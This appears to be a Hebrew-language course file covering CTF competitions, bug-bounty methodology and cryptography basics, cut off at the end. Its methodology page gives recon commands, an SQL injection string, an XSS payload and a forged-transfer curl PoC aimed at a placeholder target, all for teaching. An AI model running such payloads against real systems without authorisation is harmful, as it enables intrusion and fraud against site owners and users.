export const chapters106to110 = [
  // ============================================================
  // Chapter 106: CTF ו־Bug Bounty
  // ============================================================
  {
    id: 106,
    title: "CTF ו־Bug Bounty",
    pages: [
      {
        type: "story",
        title: "בן 19 שמצא באג ב-Apple וקיבל $50,000",
        content: `<div dir="rtl">
<div class="scenario-box scenario-story">
  <p><strong>תרחיש:</strong> Santiago Lopez היה בן 19 מארגנטינה כשהפך לאדם הראשון בהיסטוריה של <code>HackerOne</code> שהרוויח מיליון דולר ממציאת באגים. לא תואר באוניברסיטה. לא ניסיון תעסוקתי. רק מחשב נייד ועקשנות.</p>
</div>

<p>באותה תקופה, Sam Curry וצוות חברים החליטו לחקור את <code>Apple</code> בצורה שיטתית. הם סרקו את כל ה-<code>subdomains</code> של <code>apple.com</code> ומצאו <code>subdomain</code> שמריץ מופע ישן של תוכנה שנרכשה ב-2002.</p>

<div class="attack-chain">
  <div class="attack-step"><div class="attack-step-content"><strong>סריקת Subdomains</strong><p>מיפוי שיטתי של כל ה-subdomains של apple.com</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>גילוי מופע ישן</strong><p>שרת עם תוכנה מ-2002 שלא עודכנה</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>SQL Injection</strong><p>חולשה קלאסית שהובילה ל-RCE מלא</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>גישה לרשת הפנימית</strong><p>מהשרת הפגיע — חדירה לרשת Apple</p></div></div>
</div>

<div class="key-point"><strong>התוצאה:</strong> 55 חולשות, 11 קריטיות, $289,000 מ-Apple. דוח אחד בלבד שילם $50,000. Sam פרסם writeup מפורט שהפך ויראלי, וכיום הוא עובד full-time על Bug Bounty.</div>

<div class="stat-highlight"><span class="stat-number">$50K</span><span class="stat-unit">על דוח בודד</span></div>

<p>איך הם למדו את הכל? התשובה: <code>CTF</code> ו-<code>HackTheBox</code>. אותם "משחקים" שנראים כמו בילוי ערב הם בית הספר הטוב ביותר לסייבר.</p>

<p>בפרק הזה נלמד איך גם אתם יכולים להתחיל את הדרך הזו.</p>
</div>`
      },
      {
        type: "explanation",
        title: "מהו CTF? הזירה שבה האקרים מתאמנים",
        content: `<div dir="rtl">
<p><strong>CTF = Capture The Flag</strong></p>

<p>תחרות שבה פותרים אתגרי אבטחת מידע. המטרה: למצוא <code>flag</code> — מחרוזת מיוחדת (כמו <code>flag{y0u_f0und_m3}</code>) שמוכיחה שפתרת את האתגר.</p>

<div class="info-box"><strong>ℹ️ מידע:</strong> תחשבו על זה כמו חדר בריחה — רק דיגיטלי, ובמקום מנעולים פיזיים, אתם פורצים הצפנות, מנצלים חולשות בקוד, ומנתחים זיכרון.</div>

<p><strong>שלושה סוגי תחרויות CTF:</strong></p>

<div class="mini-cards">
  <div class="mini-card"><div class="mini-card-icon">🧩</div><div class="mini-card-title">Jeopardy</div><div class="mini-card-desc">אתגרים בקטגוריות (Web, Crypto, Forensics). כל אתגר = נקודות. הקשה יותר = יותר נקודות. מתאים למתחילים ומתקדמים</div></div>
  <div class="mini-card"><div class="mini-card-icon">⚔️</div><div class="mini-card-title">Attack-Defense</div><div class="mini-card-desc">כל קבוצה מקבלת שרת עם שירותים פגיעים. תקפו את היריבים תוך הגנה על השרת שלכם. לצוותים מנוסים</div></div>
  <div class="mini-card"><div class="mini-card-icon">👑</div><div class="mini-card-title">King of the Hill</div><div class="mini-card-desc">שרת אחד משותף. מי ששולט בו הכי הרבה זמן — מנצח. למי שאוהב כאוס</div></div>
</div>

<p><strong>קטגוריות נפוצות ב-Jeopardy CTF:</strong></p>

<table class="content-table">
  <tr><th>קטגוריה</th><th>מה פותרים</th><th>כלים עיקריים</th></tr>
  <tr><td><code>Web</code></td><td><code>SQLi</code>, <code>XSS</code>, <code>SSRF</code>, <code>deserialization</code></td><td><code>Burp Suite</code>, <code>sqlmap</code></td></tr>
  <tr><td><code>Pwn</code></td><td><code>Buffer overflow</code>, <code>ROP chains</code></td><td><code>pwndbg</code>, <code>pwntools</code></td></tr>
  <tr><td><code>Crypto</code></td><td>התקפות על <code>RSA</code>, <code>AES</code>, hash</td><td><code>Python</code>, <code>SageMath</code></td></tr>
  <tr><td><code>Forensics</code></td><td><code>Memory dumps</code>, <code>steganography</code>, <code>PCAP</code></td><td><code>Volatility</code>, <code>Wireshark</code></td></tr>
  <tr><td><code>Reverse</code></td><td><code>Disassembly</code>, <code>decompilation</code></td><td><code>Ghidra</code>, <code>IDA</code></td></tr>
  <tr><td><code>OSINT</code></td><td>מציאת מידע ממקורות ציבוריים</td><td><code>Maltego</code>, <code>theHarvester</code></td></tr>
</table>

<div class="key-point"><strong>נקודת מפתח:</strong> CTF הוא לא "משחק" — זו הדרך שבה רוב חוקרי האבטחה המובילים בעולם למדו את המקצוע. חברות כמו Google ו-Microsoft מגייסות ישירות מתחרויות CTF.</div>
</div>`
      },
      {
        type: "demo",
        title: "אתגר CTF — פתרון צעד אחר צעד",
        content: `<div dir="rtl">
<div class="scenario-box scenario-hack">
  <p><strong>תרחיש:</strong> קיבלתם קישור לאתר עם דף התחברות. האתגר: מצאו את ה-flag.</p>
</div>

<p><strong>שלב 1: בדיקת קוד המקור</strong></p>

<div class="code-preview"><pre><code># לחיצה ימנית -> View Page Source
# או Ctrl+U בדפדפן

&lt;!-- TODO: remove before production --&gt;
&lt;!-- Debug login: check /secret-backup.txt --&gt;
&lt;form action="/login" method="POST"&gt;
  &lt;input name="user" /&gt;
  &lt;input name="pass" type="password" /&gt;
&lt;/form&gt;</code></pre></div>

<p>מצאנו רמז! הערה שהמפתח שכח למחוק. נגלוש ל-<code>/secret-backup.txt</code>.</p>

<p><strong>שלב 2: קובץ הגיבוי</strong></p>

<div class="code-preview"><pre><code># http://challenge.ctf.com/secret-backup.txt

admin_password=ZmxhZ3tpbnNwZWN0X2V2ZXJ5dGhpbmchfQ==</code></pre></div>

<p>זה נראה כמו <code>Base64</code>. הסימן <code>==</code> בסוף הוא רמז חזק.</p>

<p><strong>שלב 3: פענוח</strong></p>

<div class="code-preview"><pre><code># בטרמינל:
echo "ZmxhZ3tpbnNwZWN0X2V2ZXJ5dGhpbmchfQ==" | base64 -d

# תוצאה:
flag{inspect_everything!}</code></pre></div>

<div class="success-box"><strong>✅ הצלחה:</strong> מצאנו את ה-flag! אתגרי CTF מלמדים לחשוב כמו תוקף — לבדוק כל פינה, לחפש הערות נשכחות, קבצי גיבוי חשופים, וקידודים שניתן לפענח. אלה בדיוק הטכניקות שמשמשות ב-Bug Bounty אמיתי.</div>

<p><strong>פלטפורמות לתרגול (חינם!):</strong></p>

<div class="mini-cards">
  <div class="mini-card"><div class="mini-card-icon">🏁</div><div class="mini-card-title">PicoCTF</div><div class="mini-card-desc">מושלם למתחילים. אתגרים מודרכים</div></div>
  <div class="mini-card"><div class="mini-card-icon">🎓</div><div class="mini-card-title">TryHackMe</div><div class="mini-card-desc">learning paths עם הסברים</div></div>
  <div class="mini-card"><div class="mini-card-icon">📦</div><div class="mini-card-title">HackTheBox</div><div class="mini-card-desc">מכונות לפריצה. הכי פופולרי</div></div>
  <div class="mini-card"><div class="mini-card-icon">🌐</div><div class="mini-card-title">PortSwigger Academy</div><div class="mini-card-desc">labs לחולשות Web (חינם)</div></div>
  <div class="mini-card"><div class="mini-card-icon">🏆</div><div class="mini-card-title">CTFtime.org</div><div class="mini-card-desc">לוח תחרויות עולמי</div></div>
</div>
</div>`
      },
      {
        type: "explanation",
        title: "Bug Bounty — לקבל כסף על מציאת חולשות",
        content: `<div dir="rtl">
<p><strong>מהו Bug Bounty?</strong></p>

<p>חברות טכנולוגיה מזמינות האקרים לחפש חולשות במוצרים שלהן — ומשלמות על כל חולשה שמתגלה. זו לא פריצה בלתי חוקית — זה הסכם רשמי שנקרא <code>Responsible Disclosure</code>.</p>

<div class="stat-highlight"><span class="stat-number">$1.5B</span><span class="stat-unit">שווי תעשיית Bug Bounty בשנה</span></div>

<p><strong>הפלטפורמות הגדולות:</strong></p>

<div class="mini-cards">
  <div class="mini-card"><div class="mini-card-icon">🟢</div><div class="mini-card-title">HackerOne</div><div class="mini-card-desc">Google, Apple, Microsoft, US DoD — $100 עד $100,000+</div></div>
  <div class="mini-card"><div class="mini-card-icon">🔵</div><div class="mini-card-title">Bugcrowd</div><div class="mini-card-desc">Tesla, Mastercard, Atlassian — $50 עד $50,000</div></div>
  <div class="mini-card"><div class="mini-card-icon">🟣</div><div class="mini-card-title">Intigriti</div><div class="mini-card-desc">חברות אירופיות, NATO — $100 עד $20,000</div></div>
  <div class="mini-card"><div class="mini-card-icon">🔴</div><div class="mini-card-title">Synack</div><div class="mini-card-desc">הזמנה בלבד, US Gov — תשלום גבוה מאוד</div></div>
</div>

<p><strong>כמה משלמים לפי חומרה?</strong></p>

<table class="content-table">
  <tr><th>חומרה</th><th>דוגמאות</th><th>תשלום טיפוסי</th></tr>
  <tr><td><span class="phase-badge phase-red">Critical</span></td><td><code>RCE</code>, <code>Auth Bypass</code>, גישה ל-DB שלם</td><td>$5,000 - $100,000+</td></tr>
  <tr><td><span class="phase-badge phase-red">High</span></td><td><code>SQLi</code>, <code>SSRF</code>, <code>IDOR</code> עם דליפת מידע רגיש</td><td>$1,000 - $10,000</td></tr>
  <tr><td><span class="phase-badge phase-gold">Medium</span></td><td><code>Stored XSS</code>, <code>CSRF</code>, חשיפת מידע</td><td>$100 - $1,000</td></tr>
  <tr><td><span class="phase-badge phase-blue">Low</span></td><td>חשיפת headers, מידע לא רגיש</td><td>$50 - $200</td></tr>
</table>

<div class="warning-box"><strong>חשוב:</strong> תמיד בדקו את ה-<code>Scope</code> לפני שמתחילים. בדיקה של דומיין שלא ב-scope יכולה להיחשב כפריצה בלתי חוקית, גם אם הכוונה הייתה טובה.</div>
</div>`
      },
      {
        type: "demo",
        title: "מתודולוגיית Bug Bounty — מ-Recon ועד דוח",
        content: `<div dir="rtl">
<p><strong>השלבים בציד באגים אמיתי</strong></p>

<div class="info-box"><strong>ℹ️ מידע:</strong> כל ציד מתחיל ב-<code>Reconnaissance</code> — מיפוי שטח ההתקפה. ככל שתמפו יותר — תמצאו יותר.</div>

<p><strong>שלב 1: <span class="phase-badge phase-gold">Recon</span> — מיפוי הנכסים</strong></p>

<div class="code-preview"><pre><code># מציאת subdomains
subfinder -d target.com -o subs.txt
# תוצאה: mail.target.com, api.target.com, staging.target.com...

# סריקת פורטים פתוחים
nmap -sV -T4 -p- target.com

# מציאת קבצים ותיקיות חשופים
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/common.txt
# מצא: /admin, /backup, /.git, /api/docs</code></pre></div>

<p><strong>שלב 2: <span class="phase-badge phase-red">Attack</span> — בדיקת חולשות</strong></p>

<div class="code-preview"><pre><code># בדיקת IDOR (Insecure Direct Object Reference)
# אם URL מכיל: /api/user/profile?id=1234
# ננסה: /api/user/profile?id=1235
# אם רואים פרופיל של משתמש אחר = IDOR!

# בדיקת SQL Injection
# שדה חיפוש באתר: test' OR '1'='1
# אם מחזיר תוצאות לא צפויות = חשוד

# בדיקת XSS
# שדה תגובה: &lt;img src=x onerror=alert(1)&gt;
# אם pop-up קופץ = XSS!</code></pre></div>

<p><strong>שלב 3: <span class="phase-badge phase-blue">Analysis</span> — תיעוד ו-PoC</strong></p>

<div class="code-preview"><pre><code># כתיבת Proof of Concept
# 1. צילומי מסך של כל שלב
# 2. curl commands שניתן לשחזר:
curl -X POST https://target.com/api/transfer \\
  -H "Cookie: session=ATTACKER_SESSION" \\
  -d "to=attacker&amount=1000&from=victim_id"
# 3. הסבר ברור של ה-Impact</code></pre></div>

<div class="key-point"><strong>נקודת מפתח:</strong> 80% מהעבודה ב-Bug Bounty היא Recon. רוב הציידים מתמקדים ביעדים הפופולריים — אבל הכסף האמיתי הוא ב-subdomains נשכחים, APIs לא מתועדים, ושירותים ישנים שלא עודכנו.</div>
</div>`
      },
      {
        type: "explanation",
        title: "כתיבת דוח שמקבל תשלום",
        content: `<div dir="rtl">
<p><strong>הדוח הוא ההבדל בין $0 ל-$10,000</strong></p>

<p>מצאתם באג? מעולה. אבל אם הדוח לא ברור, לא מפורט, או לא מוכיח השפעה — הוא יידחה. חוקרים רבים מוצאים חולשות אמיתיות ולא מקבלים תשלום בגלל דוח גרוע.</p>

<p><strong>מבנה דוח מנצח:</strong></p>

<table class="content-table">
  <tr><th>סעיף</th><th>מה לכתוב</th><th>דוגמה</th></tr>
  <tr><td><strong>Title</strong></td><td>תיאור קצר וברור</td><td>IDOR in /api/user allows accessing any user profile</td></tr>
  <tr><td><strong>Severity</strong></td><td>High / Critical + CVSS score</td><td>High (CVSS 7.5)</td></tr>
  <tr><td><strong>Description</strong></td><td>מה החולשה ואיך מצאת אותה</td><td>The user ID parameter is not validated against session...</td></tr>
  <tr><td><strong>Steps to Reproduce</strong></td><td>צעדים מדויקים לשחזור</td><td>1. Login as user A  2. Change id=X...  3. Observe...</td></tr>
  <tr><td><strong>PoC</strong></td><td>הוכחה — screenshots, curl, video</td><td>curl command + screenshot of leaked data</td></tr>
  <tr><td><strong>Impact</strong></td><td>מה תוקף יכול לעשות בפועל</td><td>Attacker can read PII of all 2M users</td></tr>
  <tr><td><strong>Remediation</strong></td><td>הצעה לתיקון</td><td>Validate user ID matches authenticated session</td></tr>
</table>

<div class="vs-container">
  <div class="vs-card vs-bad"><h4>❌ דוח שנדחה</h4><p>"מצאתי XSS באתר שלכם. תתקנו."</p><p>אין steps, אין PoC, אין impact. נדחה.</p></div>
  <div class="vs-card vs-good"><h4>✅ דוח שמשלם</h4><p>Title, Severity, Steps to Reproduce מדויקים, curl command, screenshot, impact analysis, הצעת תיקון.</p></div>
</div>

<div class="warning-box"><strong>טעויות נפוצות שגורמות לדחייה:</strong> דוח בלי Steps to Reproduce ברורים, דוח שמתאר חולשה תיאורטית בלי PoC, דוח על משהו שמחוץ ל-Scope, או דוח כפול (Duplicate) — מישהו כבר דיווח על זה לפניכם.</div>

<p><strong>הדרך המומלצת להתחיל:</strong></p>
<ol>
<li>תתרגלו ב-<code>CTF</code> ו-<code>PortSwigger Academy</code> עד שהבסיס חזק</li>
<li>התחילו עם תוכניות Bug Bounty עם <code>scope</code> רחב ותשלום נמוך</li>
<li>כתבו דוחות מעולים — גם אם החולשה קטנה</li>
<li>בנו רקורד (reputation) ועלו לתוכניות גדולות יותר</li>
</ol>
</div>`
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – האם האקינג זה אתי?",
        intro: "<p>האם מותר לפרוץ מערכת כדי להוכיח שהיא לא מאובטחת? והאם CTF הוא רק בילוי — או דרך להכשרת דור הבא של מגני הסייבר?</p>",
        blocks: [
          {
            title: "הקו הדק",
            icon: "\\u2696\\uFE0F",
            content: "ההבדל בין White Hat ל-Black Hat הוא לא הכלים — אלא ההסכמה. Bug Bounty הפך את ההאקינג לחוקי ורווחי: יש scope מוגדר, הסכם משפטי, ותגמול. אבל מה קורה כשמישהו מוצא באג חמור בחברה בלי תוכנית Bug Bounty? לדווח? לפרסם? לשתוק?"
          },
          {
            title: "הידעתם? CTF כספורט לאומי",
            icon: "\\uD83C\\uDFC6",
            content: "דרום קוריאה מממנת צוותי CTF לאומיים. צוות Defkor (כיום Defkor00t) זכה מספר פעמים ב-DEF CON CTF — האליפות העולמית. בישראל, יחידות צבאיות כמו 8200 משתמשות באתגרי CTF כחלק מהגיוס. חברות כמו Google ו-Microsoft מגייסות ישירות מתוצאות CTF."
          },
          {
            title: "האם AI ישנה את המשחק?",
            icon: "\\uD83E\\uDD16",
            content: "ב-2024, DARPA הריצה תחרות AIxCC — צוותים בנו AI שמוצא ומתקן חולשות אוטומטית. השאלה: אם AI יכול למצוא באגים מהר יותר מבני אדם, מה יהיה עתיד ה-Bug Bounty? התשובה: AI טוב ב-pattern matching, אבל חולשות לוגיות וחדשניות עדיין דורשות חשיבה אנושית יצירתית."
          }
        ]
      }
    ]
  },

  // ============================================================
  // Chapter 107: קריפטוגרפיה — המדע שמגן על המידע
  // ============================================================
  {
    id: 107,
    title: "קריפטוגרפיה — המדע שמגן על המידע",
    pages: [
      {
        type: "story",
        title: "Heartbleed — הבאג שחשף חצי מהאינטרנט",
        content: `<div dir="rtl">
<div class="scenario-box scenario-alert">
  <p><strong>תרחיש:</strong> אפריל 2014. חוקר אבטחה ב-Google מגלה שמשהו מאוד, מאוד לא בסדר.</p>
</div>

<p>Neel Mehta עבד על קוד של <code>OpenSSL</code> — הספרייה שמפעילה <code>HTTPS</code> על 66% מהאינטרנט. הוא מצא באג שגרם לו להחוויר: שרתים מדליפים זיכרון לכל מי שמבקש.</p>

<div class="attack-chain">
  <div class="attack-step"><div class="attack-step-content"><strong>Heartbeat Request</strong><p>הלקוח שולח הודעה קצרה של 1 בייט</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>שקר בגודל</strong><p>מבקש תגובה של 64KB — פי 65,536 מהגודל האמיתי</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>דליפת זיכרון</strong><p>השרת מחזיר 64KB מהזיכרון — מפתחות SSL, סיסמאות, נתוני משתמשים</p></div></div>
</div>

<div class="stat-highlight"><span class="stat-number">500,000</span><span class="stat-unit">שרתים פגיעים — 17% מכלל שרתי HTTPS</span></div>

<div class="warning-box"><strong>ההיקף:</strong> Yahoo, AWS, Cisco, Android 4.1 — כולם היו פגיעים. תוקף יכול היה לחלץ את ה-Private Key ולפענח את כל התקשורת.</div>

<p>הבאג קיבל את השם <code>Heartbleed</code>, לוגו משלו, ואתר ייעודי. הוא שינה את עולם הסייבר: הוכח שהאינטרנט בנוי על קוד open-source שנכתב על ידי מתנדבים — וצריך מימון מקצועי.</p>

<p>הלקח הקריפטוגרפי? אפילו אם ההצפנה עצמה מושלמת — באג אחד ב-implementation הורס הכול.</p>
</div>`
      },
      {
        type: "explanation",
        title: "הצפנה סימטרית — הסוד המשותף",
        content: `<div dir="rtl">
<p><strong>הרעיון הפשוט ביותר: מפתח אחד לנעילה ולפתיחה</strong></p>

<p>דמיינו כספת עם מנעול רגיל. יש מפתח אחד — מי שנועל, גם פותח. בדיוק ככה עובדת הצפנה סימטרית: אותו מפתח סודי משמש להצפנה ולפענוח.</p>

<p><strong>AES — Advanced Encryption Standard</strong></p>

<div class="info-box"><strong>ℹ️ מידע:</strong> אומץ ב-2001 על ידי <code>NIST</code> לאחר תחרות עולמית של 5 שנים. היום הוא בכל מקום: <code>WhatsApp</code>, <code>BitLocker</code>, <code>WPA2</code>, כל אתר <code>HTTPS</code>.</div>

<table class="content-table">
  <tr><th>גרסה</th><th>אורך מפתח</th><th>סיבובים</th><th>שימוש</th></tr>
  <tr><td><code>AES-128</code></td><td>128 ביט</td><td>10</td><td>מהיר, מספיק לרוב השימושים</td></tr>
  <tr><td><code>AES-256</code></td><td>256 ביט</td><td>14</td><td>סיווג Top Secret בממשל ארה"ב</td></tr>
</table>

<div class="vs-container">
  <div class="vs-card vs-bad"><h4>❌ ECB Mode</h4><p>מצפין כל בלוק בנפרד — חושף דפוסים חוזרים. אותו plaintext = אותו ciphertext. לעולם אל תשתמשו!</p></div>
  <div class="vs-card vs-good"><h4>✅ GCM Mode</h4><p>Galois/Counter Mode — נותן גם הצפנה וגם אימות שלמות. התקן המומלץ היום.</p></div>
</div>

<div class="key-point"><strong>נקודת מפתח:</strong> הצפנה סימטרית היא מהירה מאוד — מתאימה להצפנת כמויות גדולות של מידע. הבעיה: איך שני צדדים מסכימים על מפתח משותף בלי שמישהו מצותת? בדיוק בשביל זה קיימת הצפנה אסימטרית.</div>
</div>`
      },
      {
        type: "explanation",
        title: "הצפנה אסימטרית — הקסם של שני מפתחות",
        content: `<div dir="rtl">
<p><strong>האנלוגיה של תיבת הדואר</strong></p>

<p>דמיינו תיבת דואר עם חריץ: כל אחד יכול להכניס מכתב (<span class="phase-badge phase-green">Public Key</span>), אבל רק מי שיש לו את המפתח יכול לפתוח ולקרוא (<span class="phase-badge phase-red">Private Key</span>).</p>

<p>זו הצפנה אסימטרית: שני מפתחות שונים מתמטית קשורים. מה שהוצפן ב-Public Key ניתן לפענוח רק ב-Private Key, ולהפך.</p>

<p><strong>RSA — האלגוריתם שבנה את האינטרנט</strong></p>

<div class="info-box"><strong>ℹ️ מידע:</strong> פותח ב-1977 על ידי Rivest, Shamir ו-Adleman. מבוסס על עיקרון מתמטי פשוט: קל לכפול שני מספרים ראשוניים גדולים, אבל קשה מאוד לפרק את התוצאה חזרה לגורמים.</div>

<div class="vs-container">
  <div class="vs-card vs-bad"><h4>סימטרי (AES)</h4><p>מפתח אחד משותף. מהיר מאוד. 128-256 ביט. שימוש: הצפנת נתונים.</p></div>
  <div class="vs-card vs-good"><h4>אסימטרי (RSA)</h4><p>זוג: Public + Private. איטי פי 1000. 2048-4096 ביט. שימוש: החלפת מפתחות, חתימות דיגיטליות.</p></div>
</div>

<div class="key-point"><strong>נקודת מפתח:</strong> בפועל, משתמשים בשניהם ביחד. RSA מחליף מפתח AES בצורה בטוחה, ואז AES מצפין את כל הנתונים במהירות. זה בדיוק מה שקורה ב-HTTPS.</div>
</div>`
      },
      {
        type: "demo",
        title: "Hands-on — הצפנה בשורת הפקודה",
        content: `<div dir="rtl">
<p><strong>בואו נשחק עם הצפנה אמיתית באמצעות <code>openssl</code></strong></p>

<p><strong>1. הצפנה סימטרית עם AES:</strong></p>

<div class="code-preview"><pre><code># הצפנת קובץ
openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc
# יבקש סיסמה - זו תהיה המפתח

# פענוח
openssl enc -d -aes-256-cbc -in secret.enc -out decrypted.txt</code></pre></div>

<p><strong>2. יצירת זוג מפתחות RSA:</strong></p>

<div class="code-preview"><pre><code># מפתח פרטי (2048 ביט)
openssl genrsa -out private.pem 2048

# מפתח ציבורי (נגזר מהפרטי)
openssl rsa -in private.pem -pubout -out public.pem

# הצפנה עם Public Key
openssl rsautl -encrypt -pubin -inkey public.pem \\
  -in message.txt -out encrypted.bin

# פענוח עם Private Key
openssl rsautl -decrypt -inkey private.pem \\
  -in encrypted.bin -out decrypted.txt</code></pre></div>

<p><strong>3. Hash — טביעת אצבע של מידע:</strong></p>

<div class="code-preview"><pre><code># SHA-256 hash
echo -n "Hello World" | openssl dgst -sha256
# e4afa3a38e6... (תמיד 64 תווים hex)

# שינוי של אות אחת = hash שונה לחלוטין!
echo -n "Hello world" | openssl dgst -sha256
# 64ec884... (שונה לגמרי!)

# MD5 (לא בטוח! רק להדגמה)
echo -n "Hello World" | openssl dgst -md5</code></pre></div>

<div class="success-box"><strong>✅ נסו בעצמכם:</strong> פתחו טרמינל והריצו את הפקודות. שימו לב ל-Avalanche Effect: שינוי של ביט אחד בקלט משנה כ-50% מהפלט. זו תכונה קריטית של hash functions טובות.</div>
</div>`
      },
      {
        type: "explanation",
        title: "Hashing — טביעת אצבע דיגיטלית",
        content: `<div dir="rtl">
<p><strong>Hash הוא לא הצפנה — הוא חד-כיווני</strong></p>

<p>בעוד הצפנה מאפשרת לחזור למידע המקורי, hash הוא פעולה חד-כיוונית: נכנס מידע בכל גודל, יוצאת מחרוזת בגודל קבוע. אי אפשר לחזור ממנה למקור.</p>

<table class="content-table">
  <tr><th>אלגוריתם</th><th>אורך פלט</th><th>סטטוס</th><th>שימוש</th></tr>
  <tr><td><code>MD5</code></td><td>128 ביט</td><td><span class="phase-badge phase-red">שבור!</span> נמצאו התנגשויות</td><td>checksums בלבד</td></tr>
  <tr><td><code>SHA-1</code></td><td>160 ביט</td><td><span class="phase-badge phase-red">שבור!</span> Google הדגימה התנגשות ב-2017</td><td>לא לשימוש חדש</td></tr>
  <tr><td><code>SHA-256</code></td><td>256 ביט</td><td><span class="phase-badge phase-green">בטוח</span></td><td>Bitcoin, TLS, חתימות</td></tr>
  <tr><td><code>bcrypt</code></td><td>184 ביט</td><td><span class="phase-badge phase-green">בטוח + איטי בכוונה</span></td><td>אחסון סיסמאות</td></tr>
</table>

<p><strong>למה <code>bcrypt</code> עדיף לסיסמאות?</strong></p>

<p><code>SHA-256</code> מהיר מדי — GPU יכול לחשב מיליארדי hash-ים בשנייה. <code>bcrypt</code> איטי בכוונה (work factor), מה שהופך brute-force ללא כדאי. כל ניסיון לוקח ~100ms במקום ננו-שנייה.</p>

<div class="warning-box"><strong>אזהרה:</strong> לעולם אל תאחסנו סיסמאות כ-plain text או כ-MD5/SHA-256 רגיל. השתמשו ב-<code>bcrypt</code>, <code>scrypt</code>, או <code>Argon2</code> עם salt ייחודי לכל סיסמה.</div>

<div class="info-box"><strong>ℹ️ מה זה Salt?</strong> מחרוזת אקראית שמתווספת לסיסמה לפני ה-hash. בלי salt, שתי סיסמאות זהות ייצרו hash זהה — ותוקף יכול להשתמש ב-Rainbow Table (טבלה מוכנה מראש). עם salt ייחודי, כל hash שונה גם אם הסיסמה אותו דבר.</div>
</div>`
      },
      {
        type: "explanation",
        title: "TLS Handshake — מה קורה כשנכנסים לאתר HTTPS",
        content: `<div dir="rtl">
<p><strong>כל פעם שאתם רואים מנעול בדפדפן, הריקוד הזה קורה תוך מילי-שניות:</strong></p>

<div class="incident-timeline">
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">שלב 1</div><div class="timeline-desc"><strong>Client Hello</strong> — הדפדפן שולח לשרת: "שלום, אני תומך ב-TLS 1.3, אלה אלגוריתמי ההצפנה שאני מכיר."</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">שלב 2</div><div class="timeline-desc"><strong>Server Hello + Certificate</strong> — השרת עונה: "מעולה, בואו נשתמש ב-AES-256-GCM. הנה התעודה שלי עם ה-Public Key, חתומה על ידי <code>Certificate Authority</code>."</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">שלב 3</div><div class="timeline-desc"><strong>אימות התעודה</strong> — הדפדפן בודק: האם ה-CA מוכר? האם התעודה בתוקף? האם שם הדומיין מתאים? אם משהו לא בסדר — אזהרה אדומה.</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">שלב 4</div><div class="timeline-desc"><strong>החלפת מפתח</strong> — הדפדפן יוצר <code>Pre-Master Secret</code>, מצפין אותו עם ה-Public Key של השרת, ושולח. רק השרת יכול לפענח עם ה-Private Key שלו.</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">שלב 5</div><div class="timeline-desc"><strong>תקשורת מוצפנת</strong> — שני הצדדים גוזרים מפתח <code>AES</code> משותף מה-Pre-Master Secret. מרגע זה, כל התקשורת מוצפנת סימטרית — מהיר ובטוח.</div></div>
</div>

<div class="key-point"><strong>נקודת מפתח:</strong> שימו לב לאלגנטיות: RSA (איטי) משמש רק פעם אחת כדי להעביר מפתח. AES (מהיר) מצפין את כל השאר. זה השילוב שמפעיל את כל האינטרנט המאובטח.</div>

<div class="success-box"><strong>✅ TLS 1.3</strong> (2018) שיפר את התהליך: פחות צעדים (1-RTT), חייב <code>Perfect Forward Secrecy</code>, והסיר אלגוריתמים חלשים. אם שרת נפרץ מחר — תקשורת של אתמול עדיין בטוחה.</div>
</div>`
      },
      {
        type: "explanation",
        title: "קריפטוגרפיה בעולם האמיתי",
        content: `<div dir="rtl">
<p><strong>הצפנה לא נמצאת רק בשיעורי מדעי המחשב — היא בכל מקום</strong></p>

<div class="mini-cards">
  <div class="mini-card"><div class="mini-card-icon">💬</div><div class="mini-card-title">WhatsApp — E2E Encryption</div><div class="mini-card-desc">כל הודעה מוצפנת במכשיר השולח ומפוענחת רק במכשיר המקבל. Signal Protocol עם Double Ratchet: המפתחות משתנים כל הודעה. גם אם מפתח אחד נחשף — רק הודעה אחת בסכנה.</div></div>
  <div class="mini-card"><div class="mini-card-icon">₿</div><div class="mini-card-title">Bitcoin — קריפטוגרפיה ככסף</div><div class="mini-card-desc">כל ארנק הוא זוג מפתחות. Public Key = כתובת. Private Key = עסקאות. SHA-256 ל-mining ולאימות בלוקים. אם מאבדים את ה-Private Key — הכסף אבד לנצח.</div></div>
  <div class="mini-card"><div class="mini-card-icon">🔑</div><div class="mini-card-title">אחסון סיסמאות</div><div class="mini-card-desc">שירות אחראי לא שומר את הסיסמה שלכם — רק את ה-hash שלה (bcrypt + salt). כשאתם מתחברים, המערכת עושה hash ומשווה. גם אם ה-DB נגנב — הסיסמאות לא חשופות.</div></div>
</div>

<div class="key-point"><strong>נקודת מפתח:</strong> קריפטוגרפיה היא לא רק טכנולוגיה — היא זכות אדם. הצפנה מגנה על פרטיות, חופש ביטוי, ועסקאות פיננסיות של מיליארדי אנשים.</div>
</div>`
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – האם הצפנה יכולה להיות טובה מדי?",
        intro: "<p>הצפנה מגנה על פרטיות — אבל מה קורה כשהיא מגנה גם על פושעים? והאם מחשבים קוונטיים ישברו הכול?</p>",
        blocks: [
          {
            title: "מלחמת ההצפנה",
            icon: "\\uD83D\\uDD10",
            content: "ממשלות רוצות 'דלת אחורית' בהצפנה כדי לתפוס פושעים. מומחי אבטחה טוענים שדלת אחורית לממשלה היא דלת אחורית לכולם — כולל האקרים. ב-2016, ה-FBI ביקש מ-Apple לפתוח iPhone של מחבל. Apple סירבה. ה-FBI מצא דרך אחרת. הדיון ממשיך עד היום."
          },
          {
            title: "האיום הקוונטי",
            icon: "\\u269B\\uFE0F",
            content: "מחשב קוונטי חזק מספיק ישבור RSA ו-ECC תוך דקות. NIST כבר בחר אלגוריתמים פוסט-קוונטיים: CRYSTALS-Kyber להחלפת מפתחות ו-CRYSTALS-Dilithium לחתימות. האיום: 'Harvest Now, Decrypt Later' — תוקפים מקליטים תקשורת מוצפנת היום כדי לפענח אותה בעתיד."
          },
          {
